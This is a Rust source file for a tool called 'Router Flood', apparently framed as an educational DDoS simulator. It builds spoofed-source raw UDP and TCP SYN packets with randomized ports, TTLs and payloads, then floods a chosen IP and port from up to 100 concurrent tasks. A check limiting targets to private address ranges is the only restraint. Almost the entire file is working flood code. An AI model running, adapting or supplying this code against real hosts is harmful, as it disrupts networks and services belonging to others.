use clap::{Arg, Command};
use pnet::datalink::{self, NetworkInterface};
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::MutableIpv4Packet;
use pnet::packet::tcp::{MutableTcpPacket, TcpFlags};
use pnet::packet::udp::MutableUdpPacket;
use pnet::packet::MutablePacket;
use pnet::transport::{self, TransportChannelType::Layer3};
use rand::Rng;
use rand::rngs::StdRng;
use rand::SeedableRng;
use std::net::{Ipv4Addr, IpAddr};
use std::time::{Duration as StdDuration, Instant};
use tokio::sync::{Mutex, RwLock};
use tokio::time;
use std::sync::Arc;
use std::sync::atomic::{AtomicU64, AtomicBool, Ordering};

// Security configuration
const MAX_THREADS: usize = 100;
const MAX_PACKET_RATE: u64 = 10000; // packets per second per thread
const ALLOWED_PRIVATE_RANGES: &[&str] = &["192.168.0.0/16", "10.0.0.0/8", "172.16.0.0/12"];

// Statistics tracking
#[derive(Default)]
struct FloodStats {
    packets_sent: AtomicU64,
    packets_failed: AtomicU64,
    bytes_sent: AtomicU64,
    start_time: Option<Instant>,
}

impl FloodStats {
    fn new() -> Self {
        Self {
            start_time: Some(Instant::now()),
            ..Default::default()
        }
    }

    fn increment_sent(&self, bytes: u64) {
        self.packets_sent.fetch_add(1, Ordering::Relaxed);
        self.bytes_sent.fetch_add(bytes, Ordering::Relaxed);
    }

    fn increment_failed(&self) {
        self.packets_failed.fetch_add(1, Ordering::Relaxed);
    }

    fn print_stats(&self) {
        let sent = self.packets_sent.load(Ordering::Relaxed);
        let failed = self.packets_failed.load(Ordering::Relaxed);
        let bytes = self.bytes_sent.load(Ordering::Relaxed);
        
        if let Some(start) = &self.start_time {
            let elapsed = start.elapsed().as_secs_f64();
            let pps = sent as f64 / elapsed;
            let mbps = (bytes as f64 * 8.0) / (elapsed * 1_000_000.0);
            
            println!("📊 Stats - Sent: {}, Failed: {}, Rate: {:.1} pps, {:.2} Mbps", 
                     sent, failed, pps, mbps);
        }
    }
}

// Enhanced packet builder with realistic traffic patterns
struct PacketBuilder {
    rng: StdRng,
    source_ip: Ipv4Addr,
}

impl PacketBuilder {
    fn new() -> Self {
        let mut rng = StdRng::from_entropy();
        let source_ip = Ipv4Addr::new(192, 168, 1, rng.gen_range(2..254));
        Self { rng, source_ip }
    }

    fn build_udp_packet(&mut self, target_ip: Ipv4Addr, target_port: u16) -> Vec<u8> {
        // Variable payload sizes for realistic traffic
        let payload_size = self.rng.gen_range(20..1400);
        let total_len = 20 + 8 + payload_size; // IP + UDP + payload
        let mut packet_buf = vec![0u8; total_len];

        // Build IP header
        let mut ip_packet = MutableIpv4Packet::new(&mut packet_buf).unwrap();
        self.setup_ip_header(&mut ip_packet, total_len, IpNextHeaderProtocols::Udp, target_ip);

        // Build UDP header + payload
        let mut udp_packet = MutableUdpPacket::new(ip_packet.payload_mut()).unwrap();
        udp_packet.set_source(self.rng.gen_range(1024..65535));
        udp_packet.set_destination(target_port);
        udp_packet.set_length((8 + payload_size) as u16);
        
        let payload: Vec<u8> = (0..payload_size).map(|_| self.rng.gen()).collect();
        udp_packet.set_payload(&payload);
        udp_packet.set_checksum(pnet::packet::udp::ipv4_checksum(
            &udp_packet.to_immutable(),
            &self.source_ip,
            &target_ip,
        ));

        // Set IP checksum last
        ip_packet.set_checksum(pnet::packet::ipv4::checksum(&ip_packet.to_immutable()));
        packet_buf
    }

    fn build_tcp_packet(&mut self, target_ip: Ipv4Addr, target_port: u16) -> Vec<u8> {
        let total_len = 20 + 20; // IP + TCP (SYN)
        let mut packet_buf = vec![0u8; total_len];

        // Build IP header
        let mut ip_packet = MutableIpv4Packet::new(&mut packet_buf).unwrap();
        self.setup_ip_header(&mut ip_packet, total_len, IpNextHeaderProtocols::Tcp, target_ip);

        // Build TCP SYN packet
        let mut tcp_packet = MutableTcpPacket::new(ip_packet.payload_mut()).unwrap();
        tcp_packet.set_source(self.rng.gen_range(1024..65535));
        tcp_packet.set_destination(target_port);
        tcp_packet.set_sequence(self.rng.gen());
        tcp_packet.set_acknowledgement(0);
        tcp_packet.set_data_offset(5);
        tcp_packet.set_flags(TcpFlags::SYN);
        tcp_packet.set_window(self.rng.gen_range(1024..65535)); // Randomize window
        tcp_packet.set_urgent_ptr(0);
        tcp_packet.set_checksum(pnet::packet::tcp::ipv4_checksum(
            &tcp_packet.to_immutable(),
            &self.source_ip,
            &target_ip,
        ));

        // Set IP checksum last
        ip_packet.set_checksum(pnet::packet::ipv4::checksum(&ip_packet.to_immutable()));
        packet_buf
    }

    fn setup_ip_header(&mut self, ip_packet: &mut MutableIpv4Packet, total_len: usize, 
                      protocol: IpNextHeaderProtocols, target_ip: Ipv4Addr) {
        ip_packet.set_version(4);
        ip_packet.set_header_length(5);
        ip_packet.set_total_length(total_len as u16);
        ip_packet.set_ttl(self.rng.gen_range(32..128)); // Randomize TTL
        ip_packet.set_next_level_protocol(protocol);
        ip_packet.set_source(self.source_ip);
        ip_packet.set_destination(target_ip);
        ip_packet.set_identification(self.rng.gen());
        
        // Occasionally set fragmentation flags
        if self.rng.gen_bool(0.1) {
            ip_packet.set_flags(2); // Don't fragment
        }
    }
}

// Safety validation functions
fn validate_target_ip(ip: &Ipv4Addr) -> Result<(), String> {
    let ip_str = ip.to_string();
    
    // Check if it's in private ranges (basic check)
    if ip_str.starts_with("192.168.") || ip_str.starts_with("10.") || 
       (ip_str.starts_with("172.") && {
           let octets: Vec<&str> = ip_str.split('.').collect();
           if octets.len() >= 2 {
               if let Ok(second_octet) = octets[1].parse::<u8>() {
                   second_octet >= 16 && second_octet <= 31
               } else { false }
           } else { false }
       }) {
        Ok(())
    } else {
        Err(format!("Target IP {} is not in private range. This tool should only target local networks.", ip))
    }
}

fn validate_configuration(threads: usize, _target_ip: &Ipv4Addr) -> Result<(), String> {
    if threads > MAX_THREADS {
        return Err(format!("Thread count {} exceeds maximum allowed: {}", threads, MAX_THREADS));
    }
    
    // Check if running as root (required for raw sockets)
    if unsafe { libc::geteuid() } != 0 {
        return Err("This program requires root privileges for raw socket access.".to_string());
    }
    
    Ok(())
}

#[tokio::main]
async fn main() {
    let matches = Command::new("Router Flood - Network Stress Tester")
        .version("2.0")
        .about("Educational DDoS simulation for local network testing")
        .arg(
            Arg::new("target")
                .long("target")
                .short('t')
                .value_name("IP")
                .help("Target router IP (must be private range)")
                .required(true),
        )
        .arg(
            Arg::new("port")
                .long("port")
                .short('p')
                .value_name("PORT")
                .help("Target port (e.g., 80 for HTTP)")
                .required(true),
        )
        .arg(
            Arg::new("threads")
                .long("threads")
                .value_name("NUM")
                .help(&format!("Number of async tasks (default: 4, max: {})", MAX_THREADS))
                .default_value("4"),
        )
        .arg(
            Arg::new("rate")
                .long("rate")
                .value_name("PPS")
                .help("Packets per second per thread (default: 100)")
                .default_value("100"),
        )
        .arg(
            Arg::new("duration")
                .long("duration")
                .short('d')
                .value_name("SECONDS")
                .help("Test duration in seconds (default: unlimited)"),
        )
        .get_matches();

    // Parse and validate arguments
    let target_ip: Ipv4Addr = matches
        .get_one::<String>("target")
        .unwrap()
        .parse()
        .expect("Invalid IP format");
        
    if let Err(e) = validate_target_ip(&target_ip) {
        eprintln!("❌ Security Error: {}", e);
        std::process::exit(1);
    }
    
    let target_port: u16 = matches
        .get_one::<String>("port")
        .unwrap()
        .parse()
        .expect("Invalid port number");
        
    let num_tasks: usize = matches
        .get_one::<String>("threads")
        .unwrap()
        .parse()
        .expect("Invalid thread count");
        
    let packet_rate: u64 = matches
        .get_one::<String>("rate")
        .unwrap()
        .parse()
        .expect("Invalid packet rate");
        
    let duration: Option<u64> = matches
        .get_one::<String>("duration")
        .map(|s| s.parse().expect("Invalid duration"));

    // Validate configuration
    if let Err(e) = validate_configuration(num_tasks, &target_ip) {
        eprintln!("❌ Configuration Error: {}", e);
        std::process::exit(1);
    }

    // Create transport channel
    let (tx, _) = transport::transport_channel(
        4096,
        Layer3(IpNextHeaderProtocols::Udp),
    ).expect("Failed to create transport channel - are you running as root?");

    let tx = Arc::new(Mutex::new(tx));
    let stats = Arc::new(FloodStats::new());
    let running = Arc::new(AtomicBool::new(true));

    println!("🚀 Starting Enhanced Router Flood Simulation");
    println!("   Target: {}:{}", target_ip, target_port);
    println!("   Threads: {}, Rate: {} pps/thread", num_tasks, packet_rate);
    if let Some(d) = duration {
        println!("   Duration: {} seconds", d);
    }
    println!("   Press Ctrl+C to stop gracefully");
    println!();

    // Spawn statistics reporter
    let stats_clone = stats.clone();
    let running_clone = running.clone();
    tokio::spawn(async move {
        while running_clone.load(Ordering::Relaxed) {
            time::sleep(StdDuration::from_secs(5)).await;
            stats_clone.print_stats();
        }
    });

    // Set duration timer if specified
    if let Some(duration_secs) = duration {
        let running_clone = running.clone();
        tokio::spawn(async move {
            time::sleep(StdDuration::from_secs(duration_secs)).await;
            running_clone.store(false, Ordering::Relaxed);
            println!("\n⏰ Duration reached, stopping...");
        });
    }

    // Spawn flood tasks
    let mut handles = vec![];
    for task_id in 0..num_tasks {
        let tx_clone = tx.clone();
        let stats_clone = stats.clone();
        let running_clone = running.clone();
        
        let handle = tokio::spawn(async move {
            let mut packet_builder = PacketBuilder::new();
            let delay = StdDuration::from_nanos(1_000_000_000 / packet_rate); // nanoseconds per packet
            
            while running_clone.load(Ordering::Relaxed) {
                let is_udp = packet_builder.rng.gen_bool(0.7); // 70% UDP, 30% TCP for realism
                
                let packet_data = if is_udp {
                    packet_builder.build_udp_packet(target_ip, target_port)
                } else {
                    packet_builder.build_tcp_packet(target_ip, target_port)
                };

                // Send packet
                let mut tx_guard = tx_clone.lock().await;
                match tx_guard.send_to(&packet_data, IpAddr::V4(target_ip)) {
                    Ok(_) => {
                        stats_clone.increment_sent(packet_data.len() as u64);
                    },
                    Err(e) => {
                        if task_id == 0 { // Only log from first task to avoid spam
                            eprintln!("Failed to send packet: {}", e);
                        }
                        stats_clone.increment_failed();
                    }
                }
                drop(tx_guard);

                time::sleep(delay).await;
            }
        });
        handles.push(handle);
    }

    // Set up graceful shutdown
    tokio::select! {
        _ = tokio::signal::ctrl_c() => {
            println!("\n🛑 Received Ctrl+C, shutting down gracefully...");
            running.store(false, Ordering::Relaxed);
        }
        _ = async {
            for handle in handles {
                handle.await.unwrap();
            }
        } => {}
    }

    // Final statistics
    time::sleep(StdDuration::from_millis(100)).await;
    println!("\n📈 Final Statistics:");
    stats.print_stats();
    println!("✅ Simulation completed successfully");
}
